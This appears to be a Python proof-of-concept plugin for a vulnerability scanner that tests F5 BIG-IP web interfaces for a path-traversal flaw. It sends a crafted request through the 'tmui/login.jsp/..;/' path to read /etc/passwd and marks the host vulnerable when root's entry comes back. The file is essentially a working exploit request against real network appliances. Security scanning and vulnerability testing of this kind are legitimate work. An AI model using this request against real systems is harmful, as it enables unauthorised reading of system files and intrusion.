#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'f5 download'
        self.keyword = ['odin']
        self.info = 'f5 download'
        self.type = VUL_TYPE.INFO
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
                async with session.get(url=url) as res:
                    if res!=None :
                        text = str(await res.read())
                        if "root:x:" in text:
                            self.flag = 1
                            self.res.append({"info": url, "key": 'f5 download'})